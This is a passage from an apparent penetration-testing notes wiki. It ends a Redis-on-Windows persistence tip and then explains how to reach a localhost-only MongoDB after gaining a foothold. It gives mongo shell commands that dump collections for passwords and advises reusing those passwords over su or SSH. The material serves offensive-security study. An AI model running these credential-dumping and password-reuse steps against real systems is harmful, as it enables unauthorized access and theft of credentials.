`C:\Windows\System32\Tasks` reported "writable" but no file landed). Verify every claimed write by
reading the file back with the `dofile` oracle before building an RCE/persistence step on it.

<!-- promoted-slug: redis-windows-dofile-oracle-unc-coerce -->

### Localhost-bound MongoDB as a post-foothold loot target

A Mongo instance bound to `127.0.0.1:27017` does not appear in an external port scan, so it is only
reachable AFTER a foothold (web RCE, SSH). Legacy MongoDB (<3.6, and any instance with auth left off)
accepts an anonymous connection with full read, so from the foothold shell it is a prime loot source:
app back-ends frequently store a `backup`/`users` collection holding a plaintext password that is
reused for the OS/SSH account.

From the foothold (even a limited www-data web shell):
```bash
ss -lntp | grep 27017                       # confirm the localhost bind
mongo --quiet --eval 'db.getMongo().getDBNames()'
mongo <db> --quiet --eval 'db.getCollectionNames()'
mongo <db> --quiet --eval 'db.<coll>.find().forEach(printjson)'   # dump for creds
```

Then reuse any recovered password against `su`/SSH/other services before hunting a new vector
(see [[password-attacks]], [[linux-privesc]]). Always enumerate localhost-only services post-foothold;
the external nmap never saw them.

<!-- promoted-slug: mongo-localhost-postfoothold-loot -->
